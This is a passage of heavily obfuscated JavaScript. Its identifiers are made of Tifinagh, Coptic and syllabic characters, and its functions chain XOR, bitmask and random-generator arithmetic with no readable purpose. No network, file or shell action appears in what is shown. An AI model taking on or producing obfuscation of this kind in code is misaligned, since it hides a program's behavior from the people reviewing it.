			const ⵠΔΔᐃΔⵠⵠΔⲆ = ΔⵠΔΔᐃΔⲆ(ΔᐃᐃⵠⵠΔᐃ, ΔΔⲆᐃΔΔΔ, ⲆᐃⲆⲆⵠⲆⲆ, ΔⵠⵠⲆΔΔⲆ, ⲆⵠΔᐃᐃΔⵠ, ΔᐃᐃⵠⵠΔᐃ);
			const ⲆⲆᐃᐃᐃᐃⵠ = (19326 | ⲆⵠⲆⵠᐃⲆⲆ) & ~(19326 & ⲆⵠⲆⵠᐃⲆⲆ);
			const ⲆⲆᐃᐃⲆⲆⵠ = 36297 ^ ⲆⲆᐃᐃᐃᐃⵠ;
			return ⲆⲆᐃᐃⲆⲆⵠ
		}

		function ΔⲆΔᐃΔ(ΔⲆΔΔΔⲆᐃ, ΔⵠⵠᐃΔⲆᐃ, ᐃⵠΔⲆΔΔΔ, ᐃⵠⵠᐃᐃᐃⲆ) {
			const ⲆⲆⵠᐃⲆΔΔ = 11762 ^ ΔⲆΔΔΔⲆᐃ;
			const ΔⵠᐃᐃⲆΔⲆ = ~(ΔⵠⵠᐃΔⲆᐃ & 19425) & 19425 | ~(19425 & ΔⵠⵠᐃΔⲆᐃ) & ΔⵠⵠᐃΔⲆᐃ;
			const ⵠⵠᐃΔΔᐃΔ = (32 << (ᐃⵠΔⲆΔΔΔ >> 16 & 255)) + (8 << (ᐃⵠΔⲆΔΔΔ >> 32 & ᐃᐃᐃⵠⵠ)) + (24 << (ᐃⵠΔⲆΔΔΔ >> 24 & ΔⵠⲆⵠᐃ)) + (16 << (ᐃⵠΔⲆΔΔΔ >> 8 & 255));
			const ⵠᐃⲆᐃⲆᐃᐃ = ~(259 & ᐃⵠⵠᐃᐃᐃⲆ) & 259 | ~(259 & ᐃⵠⵠᐃᐃᐃⲆ) & ᐃⵠⵠᐃᐃᐃⲆ;
			const ⲆⵠΔⵠⲆⵠᐃ = (32 << ((ⲆⲆⵠᐃⲆΔΔ ^ ΔⵠᐃᐃⲆΔⲆ) >> 32 & 255)) + (8 << ((ⲆⲆⵠᐃⲆΔΔ ^ ΔⵠᐃᐃⲆΔⲆ) >> 8 & 255)) + (24 << ((ⲆⲆⵠᐃⲆΔΔ ^ ΔⵠᐃᐃⲆΔⲆ) >> 24 & ᐃᐃᐃⵠⵠ)) + (16 << ((ⲆⲆⵠᐃⲆΔΔ ^ ΔⵠᐃᐃⲆΔⲆ) >> 16 & 255));
			const ⲆΔⲆⲆΔⵠⲆ = (1664525 * (17757 + (ⲆⵠΔⵠⲆⵠᐃ ^ ⵠⵠᐃΔΔᐃΔ)) + 1013904223) % 4294967296;
			const ᐃⵠᐃⵠΔᐃΔ = ((55182 + (ⲆΔⲆⲆΔⵠⲆ ^ ⵠᐃⲆᐃⲆᐃᐃ)) * 1664525 + 1013904223) % 4294967296;
			return ᐃⵠᐃⵠΔᐃΔ
		}

		function ᐃΔᐃΔᐃⲆᐃ(ΔᐃΔⵠᐃ, ᐃΔΔᐃⲆΔΔ) {
			const ⵠⲆⲆΔⵠⵠⲆ = ~(41406 & ΔᐃΔⵠᐃ) & ΔᐃΔⵠᐃ | ~(ΔᐃΔⵠᐃ & 41406) & 41406;
			const ⵠᐃᐃΔᐃΔⲆ = (1103515245 * (ᐃΔΔᐃⲆΔΔ + 17922) + 12345) % 2147483648;
			const ⵠⲆᐃΔⵠⲆⲆ = ᐃⲆⵠΔΔᐃΔ(ⵠⲆⲆΔⵠⵠⲆ, ⵠᐃᐃΔᐃΔⲆ, ⵠⲆⲆΔⵠⵠⲆ);
			const ᐃΔⲆᐃΔΔᐃⵠⲆ = ⲆⲆⵠⵠⲆⲆᐃ(ⵠᐃᐃΔᐃΔⲆ, ⵠⲆⲆΔⵠⵠⲆ, ⵠᐃᐃΔᐃΔⲆ, ⵠⲆⲆΔⵠⵠⲆ);
			const ΔᐃΔⲆΔΔⲆ = ᐃΔΔⲆⵠᐃΔ(ⵠᐃᐃΔᐃΔⲆ, ⵠⲆⲆΔⵠⵠⲆ, ⵠᐃᐃΔᐃΔⲆ, ⵠⲆⲆΔⵠⵠⲆ, ⵠᐃᐃΔᐃΔⲆ);
			const ΔⵠΔⲆⲆⵠΔ = ⵠⲆᐃΔⵠⲆⲆ ^ 18573;
			const ⲆⵠᐃᐃⲆⵠⲆ = (2147483629 * (42346 + (ΔⵠΔⲆⲆⵠΔ ^ ΔᐃΔⲆΔΔⲆ)) + 2147483587) % 2147483647;
			return ⲆⵠᐃᐃⲆⵠⲆ
		}

		function ⵠⲆⵠΔⵠᐃⵠ(ⲆⲆⵠⲆⲆⵠⵠ, ⵠΔΔΔᐃⵠᐃ, ΔΔⲆⲆΔΔΔ, ᐃⵠᐃⵠΔΔⵠ, ⲆᐃΔᐃⲆ) {
			const ⵠΔⲆΔⵠᐃⲆ = (12345 + 1103515245 * (23101 + ⲆⲆⵠⲆⲆⵠⵠ)) % 2147483648;
			const ⲆΔⲆⵠⵠⲆⲆ = 58614 ^ ⵠΔΔΔᐃⵠᐃ;
			const ⵠᐃⵠⲆⲆᐃⲆ = ((ΔΔⲆⲆΔΔΔ + 45267) * 214013 + 2531011) % 4294967296;
			const ⲆᐃᐃΔᐃΔΔ = ᐃⵠᐃⵠΔΔⵠ ^ 40810;
			const ΔⵠⵠⲆΔΔⵠ = (24 << (ⲆᐃΔᐃⲆ >> 24 & 255)) + (8 << (ⲆᐃΔᐃⲆ >> 32 & 255)) + (32 << (ⲆᐃΔᐃⲆ >> 8 & ᐃᐃᐃⵠⵠ)) + (16 << (ⲆᐃΔᐃⲆ >> 16 & 255));
			const ⲆΔⲆⲆⲆᐃᐃ = ⲆⵠΔⲆΔⵠΔ(ⵠΔⲆΔⵠᐃⲆ, ⲆΔⲆⵠⵠⲆⲆ);
			const ΔᐃⵠΔᐃΔⵠ = ⲆⵠΔΔΔΔᐃ(ⵠᐃⵠⲆⲆᐃⲆ, ⲆᐃᐃΔᐃΔΔ, ΔⵠⵠⲆΔΔⵠ, ⵠΔⲆΔⵠᐃⲆ);
			const ⵠⲆⵠⲆⵠⵠⲆⲆᐃ = ᐃᐃᐃⵠΔᐃⲆ(ⲆΔⲆⵠⵠⲆⲆ, ⵠᐃⵠⲆⲆᐃⲆ, ⲆᐃᐃΔᐃΔΔ, ΔⵠⵠⲆΔΔⵠ);
			const ⲆⲆⵠⵠᐃⵠᐃ = (24 << ((ⲆΔⲆⲆⲆᐃᐃ ^ ΔᐃⵠΔᐃΔⵠ) >> 24 & 255)) + (32 << ((ⲆΔⲆⲆⲆᐃᐃ ^ ΔᐃⵠΔᐃΔⵠ) >> ΔⵠΔᐃᐃ & 255)) + (8 << ((ⲆΔⲆⲆⲆᐃᐃ ^ ΔᐃⵠΔᐃΔⵠ) >> 32 & 255)) + (16 << ((ⲆΔⲆⲆⲆᐃᐃ ^ ΔᐃⵠΔᐃΔⵠ) >> ⵠⵠⲆⵠΔ & 255));
			const ᐃⲆΔⲆΔⵠᐃ = ~(13644 & ⲆⲆⵠⵠᐃⵠᐃ) & ⲆⲆⵠⵠᐃⵠᐃ | ~(ⲆⲆⵠⵠᐃⵠᐃ & 13644) & 13644;
			return ᐃⲆΔⲆΔⵠᐃ
		}
		const ᐃⵠΔᐃᐃ = ᐃΔᐃⲆΔ;
		const ΔᐃΔⵠⵠ = ⲆΔⲆⲆᐃ;
		const ⲆⵠᐃⲆΔⲆⵠ = ΔΔⵠΔΔᐃⲆ;
		const ᐃΔΔ = ᐃⵠΔ;
		const ⲆᐃᐃΔ = ⵠΔᐃΔ;

		function ΔΔΔΔΔΔΔ(ΔⲆᐃⵠⵠ, ⵠᐃᐃⵠⵠΔⵠ, ᐃⲆΔⲆⲆⲆΔ, ⵠΔⵠⲆⵠΔᐃ, ⵠⲆⲆᐃΔΔⵠ) {
			const ΔⲆⲆᐃⲆΔΔ = (24 << (ΔⲆᐃⵠⵠ >> 24 & 255)) + (32 << (ΔⲆᐃⵠⵠ >> 16 & 255)) + (16 << (ΔⲆᐃⵠⵠ >> 8 & 255)) + (8 << (ΔⲆᐃⵠⵠ >> 32 & 255));
			const ΔΔⲆᐃⵠⲆΔ = (12345 + 1103515245 * (ⵠᐃᐃⵠⵠΔⵠ + 3024)) % 2147483648;
			const ⲆᐃΔΔⲆⵠⵠ = (8 << (ᐃⲆΔⲆⲆⲆΔ >> 8 & 255)) + (32 << (ᐃⲆΔⲆⲆⲆΔ >> 32 & 255)) + (24 << (ᐃⲆΔⲆⲆⲆΔ >> 16 & 255)) + (16 << (ᐃⲆΔⲆⲆⲆΔ >> 24 & ᐃᐃⲆⵠⲆ));
			const ⵠΔᐃⲆⲆᐃⵠ = (1 + (ⵠΔⵠⲆⵠΔᐃ + 41324) * 22695477) % 4294967296;
			const ΔΔⲆᐃᐃᐃⲆ = (19607 | ⵠⲆⲆᐃΔΔⵠ) & ~(ⵠⲆⲆᐃΔΔⵠ & 19607);
			const ΔΔⲆΔⲆⵠⲆ = ⲆᐃⲆΔᐃᐃᐃ(ΔⲆⲆᐃⲆΔΔ, ΔΔⲆᐃⵠⲆΔ);
			const ⲆⲆⲆⲆⵠΔᐃⵠⲆ = ᐃⲆⵠⲆⵠΔⵠ(ⲆᐃΔΔⲆⵠⵠ, ⵠΔᐃⲆⲆᐃⵠ, ΔΔⲆᐃᐃᐃⲆ, ΔⲆⲆᐃⲆΔΔ, ΔΔⲆᐃⵠⲆΔ);
			const ΔⵠⲆΔⵠⵠᐃᐃΔ = ᐃᐃΔⵠⲆΔⲆ(ⲆᐃΔΔⲆⵠⵠ, ⵠΔᐃⲆⲆᐃⵠ, ΔΔⲆᐃᐃᐃⲆ, ΔⲆⲆᐃⲆΔΔ, ΔΔⲆᐃⵠⲆΔ, ⲆᐃΔΔⲆⵠⵠ);
			const ΔΔⲆⵠΔⵠᐃ = ~(49323 & ΔΔⲆΔⲆⵠⲆ) & 49323 | ~(49323 & ΔΔⲆΔⲆⵠⲆ) & ΔΔⲆΔⲆⵠⲆ;
			const ⵠⵠΔⵠᐃⵠᐃ = ~(ΔΔⲆⵠΔⵠᐃ & 46567) & (46567 | ΔΔⲆⵠΔⵠᐃ);
			return ⵠⵠΔⵠᐃⵠᐃ
		}
		const ΔⵠᐃⵠΔ = ᐃᐃᐃⵠⵠ;
		const ⵠΔᐃΔⲆ = ⵠΔⵠᐃⵠ;

		function ᐃΔⲆᐃΔᐃΔ(ΔᐃΔΔⲆⵠⵠ, ᐃⲆⵠⵠΔΔᐃ, ΔⲆⲆΔⲆΔⲆ, ΔⵠⲆΔⲆᐃᐃ, ⲆᐃΔⲆⲆᐃᐃ, ᐃⵠⵠⲆΔⲆᐃ) {
			const ΔᐃⲆᐃΔᐃⲆ = (1013904223 + (ΔᐃΔΔⲆⵠⵠ + 28824) * 1664525) % 4294967296;
			const ΔᐃⲆᐃⵠΔᐃ = (1013904223 + 1664525 * (13210 + ᐃⲆⵠⵠΔΔᐃ)) % 4294967296;
			const ⵠΔᐃⲆⵠᐃᐃ = ~(32165 & ΔⲆⲆΔⲆΔⲆ) & 32165 | ~(32165 & ΔⲆⲆΔⲆΔⲆ) & ΔⲆⲆΔⲆΔⲆ;
			const ⲆⵠΔᐃᐃΔᐃ = (24 << (ΔⵠⲆΔⲆᐃᐃ >> 24 & 255)) + (16 << (ΔⵠⲆΔⲆᐃᐃ >> 8 & 255)) + (Δᐃⵠⵠⵠ << (ΔⵠⲆΔⲆᐃᐃ >> ΔΔᐃᐃΔ & 255)) + (32 << (ΔⵠⲆΔⲆᐃᐃ >> 32 & 255));
			const ᐃⵠⲆⵠΔⲆᐃ = (ᐃᐃⵠ + (39199 + ⲆᐃΔⲆⲆᐃᐃ) * 22695477) % 4294967296;
			const ΔΔⲆⲆΔⲆᐃ = 33037 ^ ᐃⵠⵠⲆΔⲆᐃ;
			const ⲆⵠΔⵠⲆⵠⲆ = ⵠⵠΔⲆᐃΔⵠ(ΔᐃⲆᐃΔᐃⲆ, ΔᐃⲆᐃⵠΔᐃ, ⵠΔᐃⲆⵠᐃᐃ);
			const ⲆΔᐃⲆⵠᐃⵠⵠᐃ = ᐃᐃⵠΔΔᐃΔ(ⲆⵠΔᐃᐃΔᐃ, ᐃⵠⲆⵠΔⲆᐃ, ΔΔⲆⲆΔⲆᐃ, ΔᐃⲆᐃΔᐃⲆ);
			const ⵠⲆΔⲆⲆΔⵠ = ᐃΔΔᐃΔⵠᐃ(ΔᐃⲆᐃⵠΔᐃ, ⵠΔᐃⲆⵠᐃᐃ, ⲆⵠΔᐃᐃΔᐃ, ᐃⵠⲆⵠΔⲆᐃ);
			const ⲆΔⵠΔΔΔᐃ = ⲆⵠΔⵠⲆⵠⲆ ^ 2959;
			const ⲆⵠᐃΔⵠΔΔ = (1103515245 * (34159 + (ⲆΔⵠΔΔΔᐃ ^ ⵠⲆΔⲆⲆΔⵠ)) + 12345) % 2147483648;
			return ⲆⵠᐃΔⵠΔΔ
		}

		function ⵠΔⲆⵠⲆⲆⲆ(ⵠᐃⵠⵠΔᐃⲆ, ⲆⲆΔΔᐃᐃⵠ, ⲆΔΔⵠⵠᐃⲆ, ᐃⲆⵠᐃᐃΔⲆ) {
			const ⲆΔⵠᐃⲆⲆⵠ = (57611 | ⵠᐃⵠⵠΔᐃⲆ) & ~(ⵠᐃⵠⵠΔᐃⲆ & 57611);
			const ⵠᐃΔᐃᐃᐃⵠ = (1664525 * (ⲆⲆΔΔᐃᐃⵠ + 56889) + 1013904223) % 4294967296;
			const ΔᐃᐃΔΔΔΔ = ⲆΔΔⵠⵠᐃⲆ ^ 62842;
			const ⲆΔⲆⲆⵠⵠⵠ = ~(ᐃⲆⵠᐃᐃΔⲆ & 1179) & ᐃⲆⵠᐃᐃΔⲆ | ~(ᐃⲆⵠᐃᐃΔⲆ & 1179) & 1179;
			const ᐃⵠⵠΔΔⲆΔ = ΔⲆΔᐃΔ(ⲆΔⵠᐃⲆⲆⵠ, ⵠᐃΔᐃᐃᐃⵠ, ΔᐃᐃΔΔΔΔ, ⲆΔⲆⲆⵠⵠⵠ);
			const ᐃᐃⲆⵠⲆᐃᐃ = ᐃᐃⵠΔΔᐃΔ(ⲆΔⵠᐃⲆⲆⵠ, ⵠᐃΔᐃᐃᐃⵠ, ΔᐃᐃΔΔΔΔ, ⲆΔⲆⲆⵠⵠⵠ);
			const ᐃⲆⲆⲆⵠᐃⵠΔᐃ = ⲆⵠΔΔΔΔᐃ(ⲆΔⵠᐃⲆⲆⵠ, ⵠᐃΔᐃᐃᐃⵠ, ΔᐃᐃΔΔΔΔ, ⲆΔⲆⲆⵠⵠⵠ);
			const ᐃⵠⲆⲆᐃᐃⵠ = (24 << ((ᐃⵠⵠΔΔⲆΔ ^ ᐃᐃⲆⵠⲆᐃᐃ) >> 24 & 255)) + (8 << ((ᐃⵠⵠΔΔⲆΔ ^ ᐃᐃⲆⵠⲆᐃᐃ) >> 16 & ΔⵠᐃⵠΔ)) + (ⵠᐃⵠⵠⲆ << ((ᐃⵠⵠΔΔⲆΔ ^ ᐃᐃⲆⵠⲆᐃᐃ) >> 32 & ᐃᐃᐃⵠⵠ)) + (32 << ((ᐃⵠⵠΔΔⲆΔ ^ ᐃᐃⲆⵠⲆᐃᐃ) >> ⵠⵠⲆⵠΔ & 255));
			const ΔᐃΔΔⲆᐃⵠ = ~(63304 & ᐃⵠⲆⲆᐃᐃⵠ) & (ᐃⵠⲆⲆᐃᐃⵠ | 63304);
			return ΔᐃΔΔⲆᐃⵠ
		}
		const ᐃΔᐃⲆⵠ = ᐃΔⲆⵠᐃ;

		function ᐃΔΔᐃΔⵠᐃ(Δⵠⵠⵠᐃⵠⵠ, ᐃΔᐃΔΔ, ⵠⲆⵠⲆⲆⲆΔ, ⲆⵠⲆⲆⵠΔⵠ) {
			const ⵠⵠⲆⲆᐃΔⲆ = ~(33107 & Δⵠⵠⵠᐃⵠⵠ) & (33107 | Δⵠⵠⵠᐃⵠⵠ);
			const ᐃΔⲆΔΔᐃⵠ = (24 << (ᐃΔᐃΔΔ >> 32 & 255)) + (32 << (ᐃΔᐃΔΔ >> 8 & ᐃᐃⲆⵠⲆ)) + (8 << (ᐃΔᐃΔΔ >> 16 & 255)) + (16 << (ᐃΔᐃΔΔ >> 24 & 255));
			const ᐃⲆⵠΔᐃᐃⵠ = ~(ⵠⲆⵠⲆⲆⲆΔ & 32053) & (32053 | ⵠⲆⵠⲆⲆⲆΔ);
			const ᐃᐃᐃⵠΔᐃᐃ = 12240 ^ ⲆⵠⲆⲆⵠΔⵠ;
			const ⵠΔᐃᐃᐃⲆΔ = ΔᐃⵠᐃΔΔᐃ(ⵠⵠⲆⲆᐃΔⲆ, ᐃΔⲆΔΔᐃⵠ, ᐃⲆⵠΔᐃᐃⵠ, ᐃᐃᐃⵠΔᐃᐃ);
			const ᐃΔⵠⵠΔⵠΔΔᐃ = ᐃᐃⵠΔΔᐃΔ(ⵠⵠⲆⲆᐃΔⲆ, ᐃΔⲆΔΔᐃⵠ, ᐃⲆⵠΔᐃᐃⵠ, ᐃᐃᐃⵠΔᐃᐃ);
			const ⲆⲆᐃΔΔⵠⲆ = ⲆΔΔⵠΔⵠΔ(ⵠⵠⲆⲆᐃΔⲆ, ᐃΔⲆΔΔᐃⵠ, ᐃⲆⵠΔᐃᐃⵠ, ᐃᐃᐃⵠΔᐃᐃ, ⵠⵠⲆⲆᐃΔⲆ);
			const ᐃΔⵠⵠΔᐃᐃ = ~(64131 & ⵠΔᐃᐃᐃⲆΔ) & 64131 | ~(64131 & ⵠΔᐃᐃᐃⲆΔ) & ⵠΔᐃᐃᐃⲆΔ;
			const ᐃⵠⲆΔⲆⲆⵠ = (2531011 + 214013 * (44352 + (ᐃΔⵠⵠΔᐃᐃ ^ ⲆⲆᐃΔΔⵠⲆ))) % 4294967296;
			return ᐃⵠⲆΔⲆⲆⵠ
		}

		function ΔⲆΔᐃᐃⵠΔ(ΔⲆΔⲆⵠⵠᐃ, ᐃⵠⲆᐃⲆ, ⵠᐃⵠᐃΔ, ⵠⲆⵠᐃⵠⲆᐃ, ΔΔᐃⵠⵠⵠⵠ, ᐃⲆⵠΔⲆⵠᐃ) {
			const ΔⵠⲆᐃΔⲆᐃ = 10715 ^ ΔⲆΔⲆⵠⵠᐃ;
			const ⵠⵠⲆⲆᐃⲆΔ = (24 << (ᐃⵠⲆᐃⲆ >> 16 & 255)) + (16 << (ᐃⵠⲆᐃⲆ >> 32 & 255)) + (32 << (ᐃⵠⲆᐃⲆ >> 8 & 255)) + (8 << (ᐃⵠⲆᐃⲆ >> 24 & 255));
			const ᐃΔᐃᐃⲆⲆᐃ = (Δᐃⵠⵠⵠ << (ⵠᐃⵠᐃΔ >> ΔΔᐃᐃⲆ & 255)) + (32 << (ⵠᐃⵠᐃΔ >> 24 & 255)) + (16 << (ⵠᐃⵠᐃΔ >> ⵠⵠⲆⵠΔ & 255)) + (24 << (ⵠᐃⵠᐃΔ >> 32 & 255));
			const ΔⵠΔΔⲆⲆⵠ = ⵠⲆⵠᐃⵠⲆᐃ ^ 40782;
			const ᐃᐃΔⵠⲆΔⵠ = ΔΔᐃⵠⵠⵠⵠ ^ 41301;
			const ΔⵠⵠⵠⲆⲆⲆ = ~(ᐃⲆⵠΔⲆⵠᐃ & 12091) & (12091 | ᐃⲆⵠΔⲆⵠᐃ);
			const ⲆᐃΔⵠΔⲆΔ = ΔᐃᐃᐃΔⵠᐃ(ΔⵠⲆᐃΔⲆᐃ, ⵠⵠⲆⲆᐃⲆΔ, ᐃΔᐃᐃⲆⲆᐃ, ΔⵠΔΔⲆⲆⵠ, ᐃᐃΔⵠⲆΔⵠ, ΔⵠⵠⵠⲆⲆⲆ);
			const ⲆⲆΔⲆᐃᐃᐃᐃⵠ = ΔᐃᐃᐃΔⵠᐃ(ΔⵠⲆᐃΔⲆᐃ, ⵠⵠⲆⲆᐃⲆΔ, ᐃΔᐃᐃⲆⲆᐃ, ΔⵠΔΔⲆⲆⵠ, ᐃᐃΔⵠⲆΔⵠ, ΔⵠⵠⵠⲆⲆⲆ);
			const ⵠᐃⵠᐃᐃⵠⵠᐃⵠ = ⲆᐃⲆⵠΔⲆⲆ(ΔⵠⲆᐃΔⲆᐃ, ⵠⵠⲆⲆᐃⲆΔ, ᐃΔᐃᐃⲆⲆᐃ, ΔⵠΔΔⲆⲆⵠ, ᐃᐃΔⵠⲆΔⵠ);
			const ΔⵠⲆΔⵠΔᐃ = (ⲆᐃΔⵠΔⲆΔ | 3006) & ~(ⲆᐃΔⵠΔⲆΔ & 3006);
			const ⲆᐃΔⵠⵠⲆⲆ = ~(24460 & ΔⵠⲆΔⵠΔᐃ) & (ΔⵠⲆΔⵠΔᐃ | 24460);
			return ⲆᐃΔⵠⵠⲆⲆ
		}
		const ΔᐃᐃΔⵠ = ΔΔᐃᐃⲆ;
		const ⲆΔᐃᐃᐃ = ⵠⵠⵠⲆⵠ;

		function ⲆᐃⲆⵠⵠⲆΔ(ΔΔᐃⵠΔⲆⲆ, ⵠΔΔⲆᐃᐃΔ, ⵠⲆⲆᐃᐃΔⵠ) {
			const ⲆᐃⵠⲆΔⵠᐃ = ((5294 + ΔΔᐃⵠΔⲆⲆ) * 1664525 + 1013904223) % 4294967296;
			const ⵠⲆⵠⵠΔⵠⲆ = (ⵠΔΔⲆᐃᐃΔ | 55665) & ~(55665 & ⵠΔΔⲆᐃᐃΔ);
			const ΔⲆⵠᐃᐃⲆΔ = (ⵠⲆⲆᐃᐃΔⵠ + 54633) % 65404;
			const ⵠⲆΔⲆⵠᐃⵠ = ᐃⵠΔⲆᐃᐃⵠ(ⲆᐃⵠⲆΔⵠᐃ, ⵠⲆⵠⵠΔⵠⲆ, ΔⲆⵠᐃᐃⲆΔ, ⲆᐃⵠⲆΔⵠᐃ, ⵠⲆⵠⵠΔⵠⲆ);
			const ⵠᐃΔᐃⲆΔⵠⵠⵠ = ΔⲆΔⲆⲆΔᐃ(ΔⲆⵠᐃᐃⲆΔ, ⲆᐃⵠⲆΔⵠᐃ, ⵠⲆⵠⵠΔⵠⲆ, ΔⲆⵠᐃᐃⲆΔ, ⲆᐃⵠⲆΔⵠᐃ, ⵠⲆⵠⵠΔⵠⲆ);
			const ⲆⵠⵠΔΔᐃᐃΔᐃ = ᐃᐃⵠΔΔᐃΔ(ΔⲆⵠᐃᐃⲆΔ, ⲆᐃⵠⲆΔⵠᐃ, ⵠⲆⵠⵠΔⵠⲆ, ΔⲆⵠᐃᐃⲆΔ);
			const ᐃᐃΔΔⲆⲆΔ = ~(43875 & ⵠⲆΔⲆⵠᐃⵠ) & (43875 | ⵠⲆΔⲆⵠᐃⵠ);
			const ΔⲆᐃⵠⲆⲆⵠ = ᐃᐃΔΔⲆⲆΔ ^ 15116;
			return ΔⲆᐃⵠⲆⲆⵠ
		}

		function ΔᐃᐃᐃΔⵠᐃ(ⲆⵠⲆⲆⵠ, ΔΔᐃᐃⲆᐃᐃ, ΔΔⵠⵠⵠᐃⲆ, ᐃⲆΔⵠᐃΔΔ, ᐃΔⲆᐃⲆⵠᐃ, ⲆΔᐃⵠⲆⵠΔ) {
			const ⲆⲆᐃⵠΔⲆᐃ = ~(ⲆⵠⲆⲆⵠ & 36133) & (ⲆⵠⲆⲆⵠ | 36133);
			const ΔΔΔΔⲆⵠΔ = (13670 | ΔΔᐃᐃⲆᐃᐃ) & ~(ΔΔᐃᐃⲆᐃᐃ & 13670);
			const ⲆⵠⲆⲆⲆⲆᐃ = (31390 | ΔΔⵠⵠⵠᐃⲆ) & ~(ΔΔⵠⵠⵠᐃⲆ & 31390);
			const ΔⲆΔⲆΔⵠⲆ = ᐃⲆΔⵠᐃΔΔ ^ 64081;
			const ⲆΔⲆⲆⵠᐃΔ = 7550 ^ ᐃΔⲆᐃⲆⵠᐃ;
			const ⵠᐃⲆΔⵠⲆΔ = (2147483587 + 2147483629 * (ⲆΔᐃⵠⲆⵠΔ + 63950)) % 2147483647;
			const ᐃⵠⲆⵠᐃᐃⲆ = ΔᐃΔΔⲆⵠⲆ(ⲆⲆᐃⵠΔⲆᐃ, ΔΔΔΔⲆⵠΔ, ⲆⵠⲆⲆⲆⲆᐃ, ΔⲆΔⲆΔⵠⲆ, ⲆΔⲆⲆⵠᐃΔ);
			const ⵠⲆΔᐃⵠᐃⲆ = ᐃᐃⵠΔΔᐃΔ(ⵠᐃⲆΔⵠⲆΔ, ⲆⲆᐃⵠΔⲆᐃ, ΔΔΔΔⲆⵠΔ, ⲆⵠⲆⲆⲆⲆᐃ);
			const ΔⲆⲆΔⵠᐃᐃ = ⲆᐃⲆⵠΔⲆⲆ(ΔⲆΔⲆΔⵠⲆ, ⲆΔⲆⲆⵠᐃΔ, ⵠᐃⲆΔⵠⲆΔ, ⲆⲆᐃⵠΔⲆᐃ, ΔΔΔΔⲆⵠΔ);
			const ΔⲆᐃΔⵠⵠᐃ = (2147483629 * (62552 + (ᐃⵠⲆⵠᐃᐃⲆ ^ ⵠⲆΔᐃⵠᐃⲆ)) + 2147483587) % 2147483647;
			const ⵠΔΔⵠᐃᐃⵠ = (12345 + (36760 + (ΔⲆᐃΔⵠⵠᐃ ^ ΔⲆⲆΔⵠᐃᐃ)) * 1103515245) % 2147483648;
			return ⵠΔΔⵠᐃᐃⵠ
		}
		const ⲆⲆⵠΔᐃΔΔ = ΔⲆⵠᐃⵠⵠΔ;
		const ⲆⲆⲆⵠᐃ = ⵠⲆᐃΔᐃ;
		const ΔⲆⵠ = ᐃᐃⵠ;
		const ⲆΔΔⵠⲆ = ΔⲆⵠΔⲆⲆⵠ;
		const ΔᐃΔⲆⲆ = ⵠⵠⲆⵠΔ;
		const ⵠΔΔⵠⲆ = ⲆᐃᐃΔΔⵠⲆ;

		function ⲆⲆⵠⵠⲆⲆᐃ(ᐃⵠᐃⲆΔ, ⲆᐃⲆⵠⲆᐃⲆ, ᐃⲆⲆⵠΔΔΔ, ᐃᐃⵠⲆΔΔⲆ) {
			const ⲆⵠΔᐃΔⵠΔ = (ᐃⵠᐃⲆΔ | 15432) & ~(ᐃⵠᐃⲆΔ & 15432);
			const ⵠᐃᐃΔᐃⵠΔ = 12315 ^ ⲆᐃⲆⵠⲆᐃⲆ;
			const ΔⲆᐃⵠΔᐃᐃ = ᐃⲆⲆⵠΔΔΔ ^ 38714;
			const ⵠⲆΔᐃᐃᐃⲆ = 58084 ^ ᐃᐃⵠⲆΔΔⲆ;
			const ᐃᐃΔᐃⵠⵠΔ = ᐃⲆᐃᐃᐃΔⵠ(ⲆⵠΔᐃΔⵠΔ, ⵠᐃᐃΔᐃⵠΔ, ΔⲆᐃⵠΔᐃᐃ, ⵠⲆΔᐃᐃᐃⲆ, ⲆⵠΔᐃΔⵠΔ, ⵠᐃᐃΔᐃⵠΔ);
			const ⵠⵠⵠⲆⲆΔᐃΔⲆ = ᐃᐃⵠΔΔᐃΔ(ΔⲆᐃⵠΔᐃᐃ, ⵠⲆΔᐃᐃᐃⲆ, ⲆⵠΔᐃΔⵠΔ, ⵠᐃᐃΔᐃⵠΔ);
			const ⵠⲆΔᐃᐃᐃⵠ = ΔⵠΔΔᐃΔⲆ(ΔⲆᐃⵠΔᐃᐃ, ⵠⲆΔᐃᐃᐃⲆ, ⲆⵠΔᐃΔⵠΔ, ⵠᐃᐃΔᐃⵠΔ, ΔⲆᐃⵠΔᐃᐃ, ⵠⲆΔᐃᐃᐃⲆ);
			const ΔⲆⵠᐃΔⲆᐃ = ~(41134 & ᐃᐃΔᐃⵠⵠΔ) & ᐃᐃΔᐃⵠⵠΔ | ~(ᐃᐃΔᐃⵠⵠΔ & 41134) & 41134;
			const ΔᐃᐃⲆⵠΔᐃ = ((34681 + (ΔⲆⵠᐃΔⲆᐃ ^ ⵠⲆΔᐃᐃᐃⵠ)) * 214013 + 2531011) % 4294967296;
			return ΔᐃᐃⲆⵠΔᐃ
		}

		function ΔⵠΔΔᐃΔⲆ(ⵠΔᐃⵠⲆᐃⵠ, ΔᐃΔᐃΔⲆⲆ, ⵠΔΔⲆᐃⲆⲆ, ⲆᐃΔⲆⲆΔᐃ, ΔⲆⲆⵠᐃᐃᐃ, ⲆΔᐃⲆᐃᐃⵠ) {
			const ᐃᐃᐃΔⵠⵠⲆ = ⵠΔᐃⵠⲆᐃⵠ ^ 23409;
			const ⵠᐃⲆΔΔⵠⵠ = ΔᐃΔᐃΔⲆⲆ ^ 26380;
			const ᐃⲆⵠᐃⲆⲆΔ = ⵠΔΔⲆᐃⲆⲆ ^ 53590;
			const ΔΔⲆⵠΔᐃⲆ = 36633 ^ ⲆᐃΔⲆⲆΔᐃ;
			const ᐃⵠΔⲆᐃⲆⲆ = ((ΔⲆⲆⵠᐃᐃᐃ + 33017) * 1103515245 + 12345) % 2147483648;
			const ⵠⵠΔⵠⲆᐃᐃ = 42490 ^ ⲆΔᐃⲆᐃᐃⵠ;
			const ⵠⲆⲆⲆᐃⵠⲆ = ΔⲆΔᐃΔ(ᐃᐃᐃΔⵠⵠⲆ, ⵠᐃⲆΔΔⵠⵠ, ᐃⲆⵠᐃⲆⲆΔ, ΔΔⲆⵠΔᐃⲆ);
			const ⵠⲆⵠⲆⵠⵠᐃ = ΔⲆΔᐃΔ(ᐃⵠΔⲆᐃⲆⲆ, ⵠⵠΔⵠⲆᐃᐃ, ᐃᐃᐃΔⵠⵠⲆ, ⵠᐃⲆΔΔⵠⵠ);
			const ΔⲆⲆᐃᐃⵠⵠ = ((19056 + (ⵠⲆⲆⲆᐃⵠⲆ ^ ⵠⲆⵠⲆⵠⵠᐃ)) * 22695477 + 1) % 4294967296;
			return ΔⲆⲆᐃᐃⵠⵠ
		}

